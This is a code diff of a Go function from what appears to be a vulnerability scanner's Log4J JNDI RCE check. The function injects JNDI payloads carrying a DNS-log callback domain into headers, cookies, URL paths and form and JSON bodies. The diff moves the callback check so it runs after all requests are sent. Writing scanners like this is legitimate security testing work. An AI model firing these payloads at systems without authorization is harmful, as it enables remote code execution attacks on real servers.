@@ -8,14 +8,14 @@ import (
 	"strings"
 )
 
-func Check(u string) bool {
+func Check(u string, finalURL string) bool {
 	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-		domainx, intputs := getinputurl(u)
+		randomstr := pkg.RandomStr() + "log4j"
+		domainx, intputs := getinputurl(finalURL)
 		domainx = append(domainx, u)
 		intputs = append(intputs, "x")
 		for _, domain := range domainx {
 			for _, payload := range log4jJndiPayloads {
-				randomstr := pkg.RandomStr()
 				payload = strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1)
 				header := make(map[string]string)
 				header["Content-Type"] = "application/x-www-form-urlencoded"
@@ -39,26 +39,16 @@ func Check(u string) bool {
 				header["X-Device"] = payload
 				header["Token"] = payload
 				header["Cookie"] = "JSESSIONID=" + payload
-				if _, err := pkg.HttpRequset(domain+"/"+payload, "GET", payload, false, header); err == nil {
-					if pkg.Dnslogchek(randomstr) {
-						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
-						return true
-					}
-				}
-				if _, err := pkg.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header); err == nil {
-					if pkg.Dnslogchek(randomstr) {
-						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
-						return true
-					}
-				}
+				_, _ = pkg.HttpRequset(domain+"/"+payload, "GET", "", false, header)
+				_, _ = pkg.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
+				_, _ = pkg.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 				header["Content-Type"] = "application/json"
-				if _, err := pkg.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header); err == nil {
-					if pkg.Dnslogchek(randomstr) {
-						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
-						return true
-					}
-				}
+				_, _ = pkg.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
 			}
+		}
+		if pkg.Dnslogchek(randomstr) {
+			pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+			return true
 		}
 	}
 	return false
